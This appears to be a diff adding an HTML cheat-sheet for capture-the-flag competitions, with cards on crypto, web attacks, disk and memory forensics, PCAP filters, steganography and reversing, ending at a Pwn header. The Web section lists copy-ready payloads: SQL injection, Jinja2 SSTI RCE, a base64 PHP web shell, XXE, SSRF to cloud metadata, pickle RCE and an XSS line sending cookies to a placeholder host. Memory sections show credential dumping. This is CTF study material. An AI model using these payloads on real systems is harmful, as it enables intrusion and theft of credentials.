+    <div class="tags"><span>dlp</span><span>pohlig-hellman</span><span>sage</span></div>
+    <div class="snip"><span class="lbl">small / smooth prime (SageMath)</span><button class="copy">Copy</button><pre># SageMath — recover x from y = g^x mod p
+F = GF(p); x = discrete_log(F(y), F(g))
+print(x)                               # fast when p-1 is smooth (Pohlig-Hellman)
+secret = pow(B, x, p)                  # shared key</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Online tools &amp; where to search</h3>
+    <div class="tags"><span>resources</span></div>
+    <table>
+      <tr><th>Need</th><th>Go to</th></tr>
+      <tr><td>Classical cipher ID + auto-solve</td><td><a href="https://www.dcode.fr/en" target="_blank">dcode.fr</a> · <a href="https://quipqiup.com" target="_blank">quipqiup</a> (substitution)</td></tr>
+      <tr><td>Layered encoding / XOR / "Magic"</td><td><a href="https://gchq.github.io/CyberChef" target="_blank">CyberChef</a> (download offline)</td></tr>
+      <tr><td>Factor an integer / find p,q</td><td><a href="http://factordb.com" target="_blank">factordb</a> · <a href="https://www.alpertron.com.ar/ECM.HTM" target="_blank">Alpertron ECM</a></td></tr>
+      <tr><td>RSA all-attacks / generator</td><td><a href="https://github.com/RsaCtfTool/RsaCtfTool" target="_blank">RsaCtfTool</a> · <a href="https://8gwifi.org/ctf/" target="_blank">8gwifi CTF suite</a></td></tr>
+      <tr><td>Run Sage without installing</td><td><a href="https://sagecell.sagemath.org" target="_blank">SageMathCell</a></td></tr>
+      <tr><td>Hash reverse lookup</td><td><a href="https://crackstation.net" target="_blank">CrackStation</a> · <a href="https://hashes.com/en/decrypt/hash" target="_blank">hashes.com</a></td></tr>
+      <tr><td>Big-number math / modular inverse</td><td><a href="https://www.wolframalpha.com" target="_blank">WolframAlpha</a></td></tr>
+      <tr><td>Learn / practice the attack</td><td><a href="https://cryptohack.org" target="_blank">CryptoHack</a> · <a href="https://7rocky.github.io/en/categories/crypto" target="_blank">7rocky writeups</a></td></tr>
+    </table>
+    <div class="hint w"><b>Fast path:</b> paste <code>n</code> into factordb → if factored, use the <em>basic decrypt</em> card. If not, match the symptom in the RSA map and run <code>rsactftool --attack all</code> while you think.</div>
+  </div>
+</section>
+
+<!-- ================================================================ WEB -->
+<section class="panel" data-tab="Web">
+  <h2>Web</h2>
+  <p class="lead">Workflow: <b>recon (pull JS, map endpoints) → test auth/session → hit the obvious bug class</b>. Burp for manual, ffuf/sqlmap for bulk.</p>
+
+  <div class="card">
+    <h3>Recon — scrape JS &amp; brute paths</h3>
+    <div class="tags"><span>requests</span><span>ffuf</span><span>gobuster</span></div>
+    <div class="snip"><span class="lbl">primary — pull + scan JS (your pattern)</span><button class="copy">Copy</button><pre>import requests, re
+from urllib.parse import urljoin
+BASE="https://target/"; s=requests.Session(); html=s.get(BASE).text
+for src in re.findall(r'&lt;script[^&gt;]+src=["\']([^"\']+)',html):
+    t=s.get(urljoin(BASE,src)).text
+    for kw in ("flag","secret","key","admin","api","token"):
+        if kw in t.lower(): print(src, kw)</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — dir/param/vhost fuzz</span><button class="copy">Copy</button><pre>ffuf -u https://t/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -fc 404
+gobuster dir -u https://t -w common.txt -x php,txt,bak,zip
+ffuf -u 'https://t/?FUZZ=1' -w seclists/.../burp-parameter-names.txt -fs 0
+ffuf -u https://t -H 'Host: FUZZ.t' -w subdomains.txt -fs 0        # vhosts</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Authenticated session reuse</h3>
+    <div class="tags"><span>cookies</span><span>curl</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>s=requests.Session()
+s.cookies.set("session","PASTE_COOKIE",domain="target",path="/")
+print(s.get("https://target/admin",headers={"User-Agent":"Mozilla/5.0"}).text)</pre></div>
+    <div class="snip"><span class="lbl alt">alternative</span><button class="copy">Copy</button><pre>curl -s https://target/admin -b 'session=...' -A 'Mozilla/5.0'
+# copy as curl straight from Burp / DevTools Network tab</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>SQL injection</h3>
+    <div class="tags"><span>sqlmap</span><span>union</span><span>blind</span></div>
+    <div class="snip"><span class="lbl">primary — sqlmap</span><button class="copy">Copy</button><pre>sqlmap -u "https://t/item?id=1" --batch --dbs
+sqlmap -r req.txt --batch --level 5 --risk 3 --dump -D ctf -T flag</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — manual</span><button class="copy">Copy</button><pre>' OR 1=1-- -
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
+' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
+' AND SLEEP(5)-- -                              # blind time-based
+admin'--                                         # login bypass</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Injection payload bank (SSTI/LFI/XXE/SSRF/XSS)</h3>
+    <div class="tags"><span>ssti</span><span>lfi</span><span>xxe</span><span>ssrf</span><span>xss</span></div>
+    <div class="snip"><span class="lbl">copy-ready</span><button class="copy">Copy</button><pre># SSTI detect:  {{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>
+{{ cycler.__init__.__globals__.os.popen('id').read() }}           # Jinja2 RCE
+# LFI:
+../../../../etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+# XXE:
+&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
+# SSRF targets:
+http://127.0.0.1/  http://169.254.169.254/latest/meta-data/  file:///etc/passwd
+# XSS exfil:
+&lt;img src=x onerror="fetch('//ME/?c='+document.cookie)"&gt;</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>JWT &amp; deserialization</h3>
+    <div class="tags"><span>jwt</span><span>pickle</span><span>php</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>jwt_tool TOKEN -C -d rockyou.txt              # crack HS256 secret
+jwt_tool TOKEN -X a                            # alg:none
+jwt_tool TOKEN -X k -pk public.pem             # RS256->HS256 key confusion</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — insecure deserialization</span><button class="copy">Copy</button><pre># PHP: O:4:"User":1:{s:4:"role";s:5:"admin";}  (craft object)
+# Python pickle RCE:
+python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("x",(),{"__reduce__":lambda s:(os.system,("id",))})())))'
+# Java: ysoserial CommonsCollections payloads</pre></div>
+  </div>
+</section>
+
+<!-- ================================================================ DISK -->
+<section class="panel" data-tab="Forensics: Disk">
+  <h2>Forensics — Disk, Filesystem &amp; OS Artifacts</h2>
+  <p class="lead">For disk images (like the CSCV Windows dumps): <b>mount/list → carve deleted → mine OS artifacts (registry, logs, prefetch, MFT) → build a timeline</b>. Below is nearly every artifact worth pulling.</p>
+
+  <div class="card">
+    <h3>Open / mount / list an image</h3>
+    <div class="tags"><span>sleuthkit</span><span>mount</span><span>Autopsy</span><span>ewf</span></div>
+    <div class="snip"><span class="lbl">primary — Sleuth Kit</span><button class="copy">Copy</button><pre>mmls image.dd                         # partitions -> note start sector (e.g. 2048)
+fsstat -o 2048 image.dd               # filesystem details
+fls -r -o 2048 image.dd | less        # recursive listing (deleted marked *)
+icat -o 2048 image.dd 12345 > file    # extract by inode
+tsk_recover -e -o 2048 image.dd out/  # recover ALL (incl. deleted)</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — mount / E01 / GUI</span><button class="copy">Copy</button><pre>sudo mount -o ro,loop,offset=$((2048*512)) image.dd /mnt
+ewfmount image.E01 /mnt/ewf && mmls /mnt/ewf/ewf1   # EnCase E01
+autopsy    # GUI: timeline, keyword search, carving, web/registry parsers
+guestfish --ro -a image.qcow2 -i      # VM disks</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Recover deleted &amp; carve</h3>
+    <div class="tags"><span>photorec</span><span>extundelete</span><span>foremost</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>photorec image.dd                      # interactive signature carving (any FS)
+foremost -i image.dd -o carved/
+scalpel -o carved image.dd
+extundelete image.dd --restore-all      # ext3/4 journal recovery</pre></div>
+    <div class="hint"><b>NTFS deleted:</b> look in <code>$Recycle.Bin</code> — <code>$I</code> files hold original path+time, <code>$R</code> files hold the data.</div>
+  </div>
+
+  <div class="card">
+    <h3>Windows Registry — the key hives &amp; what's in them</h3>
+    <div class="tags"><span>regripper</span><span>regipy</span><span>python-registry</span></div>
+    <div class="snip"><span class="lbl">primary — RegRipper per hive</span><button class="copy">Copy</button><pre>regripper -r SYSTEM   -f system  > system.txt
+regripper -r SOFTWARE -f software> software.txt
+regripper -r SAM      -f sam     > sam.txt
+regripper -r NTUSER.DAT -f ntuser> ntuser.txt
+regripper -r Amcache.hve -f amcache > amcache.txt</pre></div>
+    <table>
+      <tr><th>Hive</th><th>Artifact / key</th><th>Tells you</th></tr>
+      <tr><td>SYSTEM</td><td>ComputerName, TimeZoneInformation, Services, USBSTOR, MountedDevices</td><td>host name, TZ, services, USB devices plugged in</td></tr>
+      <tr><td>SOFTWARE</td><td>Microsoft\Windows\CurrentVersion\Run, Uninstall, NetworkList, RDP</td><td>autoruns, installed apps, known networks</td></tr>
+      <tr><td>SAM</td><td>Domains\Account\Users</td><td>local users + password hashes</td></tr>
+      <tr><td>NTUSER.DAT</td><td>UserAssist, RecentDocs, TypedPaths, RunMRU, WordWheelQuery</td><td>programs run (+counts), files opened, typed paths, searches</td></tr>
+      <tr><td>SOFTWARE/SYSTEM</td><td>ShimCache (AppCompatCache), AmCache.hve</td><td>executables present/run even if deleted</td></tr>
+      <tr><td>NTUSER</td><td>Explorer\Shell Bags (BagMRU)</td><td>folders browsed, incl. deleted/removable</td></tr>
+    </table>
+    <div class="snip"><span class="lbl alt">alternative — regipy / raw python</span><button class="copy">Copy</button><pre>registry-dump NTUSER.DAT                       # regipy
+python3 -c "from Registry import Registry;h=Registry.Registry('SYSTEM');print(h.root().subkeys())"</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Execution, persistence &amp; file-knowledge artifacts</h3>
+    <div class="tags"><span>prefetch</span><span>amcache</span><span>jumplists</span><span>lnk</span><span>srum</span></div>
+    <table>
+      <tr><th>Artifact</th><th>Path</th><th>Parse with</th></tr>
+      <tr><td>Prefetch (ran programs)</td><td><code>C:\Windows\Prefetch\*.pf</code></td><td>PECmd.exe / <code>prefetch</code> py</td></tr>
+      <tr><td>Amcache (presence)</td><td><code>Amcache.hve</code></td><td>AmcacheParser / regripper</td></tr>
+      <tr><td>Jump Lists (recent files)</td><td><code>...\Recent\AutomaticDestinations</code></td><td>JLECmd.exe</td></tr>
+      <tr><td>LNK shortcuts</td><td><code>...\Recent\*.lnk</code></td><td>LECmd.exe / <code>lnkinfo</code></td></tr>
+      <tr><td>SRUM (app/net usage)</td><td><code>...\sru\SRUDB.dat</code></td><td>SrumECmd / srum-dump</td></tr>
+      <tr><td>Scheduled Tasks</td><td><code>C:\Windows\System32\Tasks</code></td><td>read XML</td></tr>
+      <tr><td>WMI persistence</td><td><code>OBJECTS.DATA</code></td><td>PyWMIPersistenceFinder</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>$MFT / $UsnJrnl / timestamps (anti-forensics)</h3>
+    <div class="tags"><span>MFT</span><span>timestomp</span><span>usnjrnl</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>analyzeMFT.py -f \$MFT -o mft.csv
+MFTECmd.exe -f $MFT --csv . --csvf mft.csv          # Eric Zimmerman (Win)
+MFTECmd.exe -f $Extend\$UsnJrnl:$J --csv .           # file create/delete/rename log</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — full super-timeline</span><button class="copy">Copy</button><pre>log2timeline.py plaso.dump image.dd
+psort.py -o l2tcsv plaso.dump "date > '2024-01-01'" > timeline.csv</pre></div>
+    <div class="hint w"><b>Timestomp tells:</b> $STANDARD_INFO older than $FILE_NAME; sub-second field = <code>.0000000</code>; modified time earlier than created time.</div>
+  </div>
+
+  <div class="card">
+    <h3>Event logs (EVTX) — IDs that matter</h3>
+    <div class="tags"><span>evtx</span><span>chainsaw</span><span>wevtutil</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>evtx_dump.py Security.evtx > sec.xml
+chainsaw hunt Security.evtx -s sigma/ --mapping mappings/sigma-event-logs-all.yml
+EvtxECmd.exe -f Security.evtx --csv .</pre></div>
+    <table>
+      <tr><th>ID</th><th>Meaning</th><th>ID</th><th>Meaning</th></tr>
+      <tr><td>4624 / 4625</td><td>logon success / fail</td><td>4688</td><td>process created</td></tr>
+      <tr><td>4634 / 4647</td><td>logoff</td><td>4672</td><td>admin logon</td></tr>
+      <tr><td>4720 / 4726</td><td>user created / deleted</td><td>4698</td><td>scheduled task created</td></tr>
+      <tr><td>4648</td><td>explicit-cred logon (lateral)</td><td>7045</td><td>service installed</td></tr>
+      <tr><td>1102</td><td>audit log cleared (!)</td><td>4104</td><td>PowerShell script block</td></tr>
+    </table>
+    <div class="hint"><b>Logon type</b> (field in 4624): 2=interactive, 3=network, 10=RDP.</div>
+  </div>
+
+  <div class="card">
+    <h3>Browsers, email &amp; documents</h3>
+    <div class="tags"><span>sqlite</span><span>pst</span><span>pdf</span><span>office</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre># Browser history (Chrome/Firefox are SQLite):
+sqlite3 History "SELECT url,title,datetime(last_visit_time/1e6-11644473600,'unixepoch') FROM urls;"
+# Email:
+readpst mailbox.pst -o out/          # PST/OST -> mbox
+# Phishing EML headers -> check Received, SPF/DKIM, Reply-To mismatch
+# PDF / Office macros:
+pdfid file.pdf; pdf-parser --search JavaScript file.pdf
+olevba doc.docm                       # extract VBA macros
+oledump.py doc.doc</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>BitLocker / full-disk encryption</h3>
+    <div class="tags"><span>bitlocker</span><span>dislocker</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>dislocker -r -V enc.dd -p RECOVERY-KEY -- /mnt/dis
+mount -o ro,loop /mnt/dis/dislocker-file /mnt/clear
+bitlocker2john -i enc.dd > h && hashcat -m 22100 h rockyou.txt   # crack</pre></div>
+  </div>
+</section>
+
+<!-- ================================================================ MEMORY -->
+<section class="panel" data-tab="Forensics: Memory">
+  <h2>Forensics — Memory</h2>
+  <p class="lead">For RAM captures (<em>TheMissingMemory</em>). Volatility 3 (no profile) is default; use Vol2 for very old captures. Recon processes → pull the interesting one's cmdline/files/creds.</p>
+
+  <div class="card">
+    <h3>Volatility 3 — recon</h3>
+    <div class="tags"><span>volatility3</span><span>windows</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>vol -f mem.raw windows.info
+vol -f mem.raw windows.pslist
+vol -f mem.raw windows.pstree             # parent/child (spot suspicious spawns)
+vol -f mem.raw windows.psscan             # incl. hidden/terminated
+vol -f mem.raw windows.cmdline            # full command lines
+vol -f mem.raw windows.netscan            # connections + owning pid
+vol -f mem.raw windows.getsids            # token/privileges per process</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Volatility 3 — extract &amp; hunt</h3>
+    <div class="tags"><span>dumpfiles</span><span>malfind</span><span>hashdump</span></div>
+    <div class="snip"><span class="lbl">primary — secrets &amp; injection</span><button class="copy">Copy</button><pre>vol -f mem.raw windows.hashdump           # SAM hashes
+vol -f mem.raw windows.lsadump            # LSA secrets
+vol -f mem.raw windows.cachedump          # cached domain creds
+vol -f mem.raw windows.malfind --dump     # injected/RWX code
+vol -f mem.raw windows.svcscan            # services (persistence)</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — files, registry, strings</span><button class="copy">Copy</button><pre>vol -f mem.raw windows.filescan | grep -i flag
+vol -f mem.raw windows.dumpfiles --virtaddr 0xADDR
+vol -f mem.raw windows.registry.printkey --key "Software\Microsoft\...\Run"
+vol -f mem.raw windows.registry.hivelist
+vol -f mem.raw windows.cmdscan            # console command history
+vol -f mem.raw windows.clipboard
+strings -a -t d mem.raw | grep -i 'flag{' # brute fallback</pre></div>
+    <div class="hint"><b>Linux/Mac:</b> same plugins under <code>linux.*</code> / <code>mac.*</code> (<code>linux.bash</code> = shell history, <code>linux.pslist</code>, <code>linux.check_syscall</code>).</div>
+  </div>
+
+  <div class="card">
+    <h3>Volatility 2 fallback (legacy)</h3>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>volatility -f mem.raw imageinfo               # suggest profile
+volatility -f mem.raw --profile=Win7SP1x64 pslist
+volatility -f mem.raw --profile=Win7SP1x64 hashdump
+volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0xADDR -D out/</pre></div>
+  </div>
+</section>
+
+<!-- ================================================================ NETWORK -->
+<section class="panel" data-tab="Network/PCAP">
+  <h2>Network / PCAP Analysis</h2>
+  <p class="lead">Competition workflow: <b>Statistics → Protocol Hierarchy</b> to see what's there, <b>Conversations</b> to find the interesting stream, <b>Follow Stream</b> / <b>Export Objects</b> to pull the data. Below: nearly every display filter you'll reach for.</p>
+
+  <div class="card">
+    <h3>Triage a capture</h3>
+    <div class="tags"><span>tshark</span><span>wireshark</span><span>capinfos</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>capinfos cap.pcap                              # size, time range, packet count
+tshark -r cap.pcap -q -z io,phs                # protocol hierarchy (what's inside)
+tshark -r cap.pcap -q -z conv,tcp              # top TCP conversations
+tshark -r cap.pcap -q -z conv,ip
+tshark -r cap.pcap -q -z endpoints,ip          # who talked</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — Zeek structured logs</span><button class="copy">Copy</button><pre>zeek -r cap.pcap        # produces conn.log http.log dns.log files.log ...
+cat http.log | zeek-cut host uri | sort | uniq -c | sort -rn</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Follow streams &amp; export files</h3>
+    <div class="tags"><span>follow</span><span>export-objects</span><span>tcpflow</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre># GUI: right-click packet -> Follow -> TCP/HTTP/TLS Stream
+# GUI: File -> Export Objects -> HTTP / SMB / FTP / TFTP / IMF(email)
+tshark -r cap.pcap -z follow,tcp,ascii,3 -q    # follow stream #3 on CLI
+tcpflow -r cap.pcap -o streams/                 # every stream to files
+foremost -i cap.pcap -o carved/                  # carve files out of raw pcap</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Display filters — by protocol (the big reference)</h3>
+    <div class="tags"><span>display-filters</span><span>wireshark</span></div>
+    <table>
+      <tr><th>Goal</th><th>Display filter</th></tr>
+      <tr><td>HTTP requests only</td><td><code>http.request</code></td></tr>
+      <tr><td>HTTP by host / uri</td><td><code>http.host contains "x"</code> · <code>http.request.uri contains "flag"</code></td></tr>
+      <tr><td>HTTP POST bodies</td><td><code>http.request.method == "POST"</code></td></tr>
+      <tr><td>HTTP responses / codes</td><td><code>http.response.code == 200</code></td></tr>
+      <tr><td>Basic-auth creds</td><td><code>http.authorization</code></td></tr>
+      <tr><td>DNS queries</td><td><code>dns.flags.response == 0</code></td></tr>
+      <tr><td>DNS by name (exfil?)</td><td><code>dns.qry.name contains "flag"</code></td></tr>
+      <tr><td>DNS TXT answers</td><td><code>dns.txt</code></td></tr>
+      <tr><td>FTP commands / creds</td><td><code>ftp</code> · <code>ftp.request.command == "PASS"</code></td></tr>
+      <tr><td>FTP data transfers</td><td><code>ftp-data</code></td></tr>
+      <tr><td>Telnet (cleartext)</td><td><code>telnet</code></td></tr>
+      <tr><td>SMTP / IMAP / POP mail</td><td><code>smtp</code> · <code>imap</code> · <code>pop</code></td></tr>
+      <tr><td>SMB / files</td><td><code>smb2</code> · <code>smb2.filename contains "x"</code></td></tr>
+      <tr><td>Kerberos / NTLM</td><td><code>kerberos</code> · <code>ntlmssp</code></td></tr>
+      <tr><td>TLS handshake / SNI</td><td><code>tls.handshake.type == 1</code> · <code>tls.handshake.extensions_server_name</code></td></tr>
+      <tr><td>Certificates</td><td><code>tls.handshake.certificate</code></td></tr>
+      <tr><td>ICMP (tunneling?)</td><td><code>icmp</code> · <code>data.len > 48 && icmp</code></td></tr>
+      <tr><td>ARP (spoofing)</td><td><code>arp.duplicate-address-detected</code></td></tr>
+      <tr><td>DHCP hostnames</td><td><code>dhcp</code> · <code>bootp.option.hostname</code></td></tr>
+      <tr><td>SNMP community string</td><td><code>snmp</code></td></tr>
+      <tr><td>IRC (C2 chat)</td><td><code>irc</code></td></tr>
+      <tr><td>Modbus/ICS</td><td><code>modbus</code> · <code>s7comm</code></td></tr>
+      <tr><td>USB (HID keystrokes)</td><td><code>usb.capdata</code> · <code>usbhid.data</code></td></tr>
+      <tr><td>Wi-Fi mgmt / EAPOL (handshake)</td><td><code>wlan.fc.type_subtype == 8</code> · <code>eapol</code></td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <h3>Display filters — content &amp; byte matching</h3>
+    <div class="snip"><span class="lbl">copy-ready</span><button class="copy">Copy</button><pre>frame contains "flag{"                 # literal bytes anywhere in frame
+http contains "password"
+tcp matches "(?i)flag"                  # regex, case-insensitive
+tcp.stream == 3                          # isolate one stream (then Follow)
+tcp.port == 1337 || udp.port == 1337
+ip.addr == 10.0.0.5 && tcp.flags.syn==1 && tcp.flags.ack==0   # SYN scans
+tcp.flags.push == 1                      # data-bearing segments
+tcp.len > 0                              # non-empty payloads
+tcp.analysis.retransmission              # noise to hide
+data.data[0:4] == 50:4b:03:04            # ZIP magic in payload (carving hint)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>tshark field extraction recipes</h3>
+    <div class="tags"><span>tshark</span><span>-T fields</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre># all visited URLs
+tshark -r cap.pcap -Y http.request -T fields -e http.host -e http.request.uri
+# DNS names (spot exfil)
+tshark -r cap.pcap -Y dns -T fields -e dns.qry.name | sort -u
+# FTP/HTTP creds
+tshark -r cap.pcap -Y 'ftp.request.command=="USER" || ftp.request.command=="PASS"' -T fields -e ftp.request.arg
+# extract a field's raw hex (then decode)
+tshark -r cap.pcap -Y 'dns.txt' -T fields -e dns.txt | tr -d '\n' | xxd -r -p</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>USB keyboard (HID) keystroke recovery — classic CTF</h3>
+    <div class="tags"><span>usb</span><span>hid</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre># dump the 8-byte HID reports:
+tshark -r usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata | sed 's/://g' > hid.txt
+# decode with the well-known parser:
+python3 ~/tools/ctf-usb-keyboard-parser/usbkeyboard.py hid.txt
+# (mouse movements: usbhid.data -> plot X/Y deltas to draw the flag)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Decrypt TLS</h3>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre># If an SSLKEYLOGFILE / keylog is provided:
+#   Wireshark > Preferences > Protocols > TLS > (Pre)-Master-Secret log filename
+# If the server RSA private key is given (RSA kex only):
+#   Preferences > TLS > RSA keys list > add server.key
+editcap --inject-secrets tls,keys.log cap.pcap dec.pcapng</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Capture filters (BPF) — if you capture live</h3>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>tcpdump -i eth0 -w out.pcap 'port 80 or port 443'
+tcpdump -i eth0 'host 10.0.0.5 and tcp'
+tcpdump -i eth0 'udp port 53'            # DNS
+tcpdump -i eth0 'icmp'
+# note: capture filters use BPF syntax, display filters use Wireshark syntax — different!</pre></div>
+  </div>
+</section>
+
+<!-- ================================================================ STEGO -->
+<section class="panel" data-tab="Stego">
+  <h2>Steganography</h2>
+  <p class="lead">Run the full first-pass battery on every media file (<em>Ghost_in_the_SVG, Postcard_from_Paradise</em>). Match the tool to the format — LSB tools differ for PNG vs JPG vs audio.</p>
+
+  <div class="card">
+    <h3>Images — first-pass battery (run ALL)</h3>
+    <div class="tags"><span>exiftool</span><span>binwalk</span><span>zsteg</span><span>steghide</span><span>stegsolve</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>exiftool img.*                    # metadata, comments, GPS, thumbnails
+binwalk -e img.*                  # appended ZIP/other files
+strings -n 6 img.* | grep -i flag
+zsteg -a img.png                  # PNG/BMP LSB: ALL channels/orders/bits
+steghide extract -sf img.jpg      # JPG/BMP/WAV (passphrase: try blank first)
+pngcheck -v img.png               # extra/hidden chunks, size mismatch</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — visual + passphrase crack + auto</span><button class="copy">Copy</button><pre>stegsolve                         # bit planes, channel/XOR views, frame browser (GUI)
+stegseek img.jpg rockyou.txt      # crack steghide passphrase FAST
+stegoveritas img.png              # runs many extractors + transforms at once
+exiftool -ThumbnailImage -b img.jpg > thumb.jpg   # thumbnail can differ from image!</pre></div>
+    <div class="hint"><b>Rule of thumb:</b> PNG/BMP → <code>zsteg</code>; JPG → <code>steghide</code>/<code>stegseek</code> + <code>outguess</code>; GIF → check frames; any → <code>binwalk</code>+<code>exiftool</code> always.</div>
+  </div>
+
+  <div class="card">
+    <h3>Audio</h3>
+    <div class="tags"><span>spectrogram</span><span>sonic-visualiser</span><span>DTMF</span></div>
+    <div class="snip"><span class="lbl">primary — spectrogram (flag drawn in it)</span><button class="copy">Copy</button><pre>sox in.wav -n spectrogram -o spec.png
+# or Audacity / Sonic Visualiser -> Layer -> Add Spectrogram
+audacity in.wav   # also: Analyze channels, slow down, reverse</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — LSB / DTMF / morse tones</span><button class="copy">Copy</button><pre># WAV LSB:
+python3 -c "import wave;w=wave.open('a.wav');d=w.readframes(w.getnframes());print(bytes(((b&1) for b in d)))"
+# DTMF phone tones -> decode at dialabc.com or multimon-ng
+multimon-ng -a DTMF -a MORSE_CW a.wav</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Text / SVG / PDF / documents</h3>
+    <div class="tags"><span>svg</span><span>zero-width</span><span>whitespace</span></div>
+    <div class="snip"><span class="lbl">primary — SVG is XML text</span><button class="copy">Copy</button><pre>xmllint --format ghost.svg | less          # hidden elements, tiny/transparent/offscreen text
+grep -aiE 'flag|opacity:0|display:none|fill:#fff|data:' ghost.svg</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — zero-width &amp; whitespace stego</span><button class="copy">Copy</button><pre># zero-width chars (U+200B/C/D) hidden in text: paste into 330k.github.io/ or
+python3 -c "print([hex(ord(c)) for c in open('f').read() if ord(c)>0x2000])"
+stegsnow -C f.txt            # whitespace-encoded (snow)
+# PDF: layers/hidden text -> pdftotext -layout; mutool extract; strings</pre></div>
+  </div>
+</section>
+
+<!-- ================================================================ REV -->
+<section class="panel" data-tab="Reversing">
+  <h2>Reverse Engineering</h2>
+  <p class="lead">For <em>Serial_Gate / Verdict_Engine</em>: read the check with a decompiler, watch the comparison at runtime, or let a symbolic engine solve the input for you.</p>
+
+  <div class="card">
+    <h3>Static triage &amp; decompile</h3>
+    <div class="tags"><span>ghidra</span><span>radare2</span><span>strings</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>file bin; checksec --file=bin
+strings -a bin | grep -iE 'flag|correct|wrong|key|serial|license'
+ghidra                           # import -> analyze -> read decompiled main()/check()
+r2 -A bin                        # then: afl (funcs); s main; pdf; VV (graph)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Dynamic — watch the comparison</h3>
+    <div class="tags"><span>ltrace</span><span>gdb</span><span>strace</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>ltrace ./bin               # strcmp(your_input, "SECRET") often prints the flag!
+strace ./bin               # file/network access, hidden config
+gdb -q ./bin               # break *check; run; then read RSI/RDI at the cmp
+#  (pwndbg/gef installed: nicer registers, 'telescope', 'pattern')</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Symbolic / constraint solving (keygen)</h3>
+    <div class="tags"><span>angr</span><span>z3</span></div>
+    <div class="snip"><span class="lbl">primary — angr to reach "Correct"</span><button class="copy">Copy</button><pre>import angr, claripy
+p=angr.Project("bin",auto_load_libs=False)
+sm=p.factory.simulation_manager(p.factory.full_init_state())
+sm.explore(find=lambda s:b"Correct" in s.posix.dumps(1),
+           avoid=lambda s:b"Wrong"   in s.posix.dumps(1))
+print(sm.found[0].posix.dumps(0))        # stdin that wins = the flag/serial</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — z3 for arithmetic checks</span><button class="copy">Copy</button><pre>from z3 import *
+c=[BitVec(f'c{i}',8) for i in range(16)]
+s=Solver()
+for ch in c: s.add(ch>=0x20, ch&lt;0x7f)      # printable
+s.add(c[0]^0x42==0x13, c[1]+c[2]==0xa0)      # transcribe each constraint
+print(s.check()); m=s.model(); print(bytes(m[x].as_long() for x in c))</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Other targets</h3>
+    <div class="hint"><b>.NET:</b> dnSpy / ILSpy (full decompile, even edit+run). <b>Java:</b> jadx / jd-gui on the .jar. <b>Android APK:</b> <code>apktool d app.apk</code> + <code>jadx-gui</code>. <b>Python:</b> <code>pyinstxtractor</code> then <code>uncompyle6</code>/<code>decompyle3</code>. <b>Packed:</b> <code>upx -d</code>; else dump from memory after unpacking.</div>
+  </div>
+</section>
+
+<!-- ================================================================ PWN -->
+<section class="panel" data-tab="Pwn">
+  <h2>Pwn / Binary Exploitation</h2>
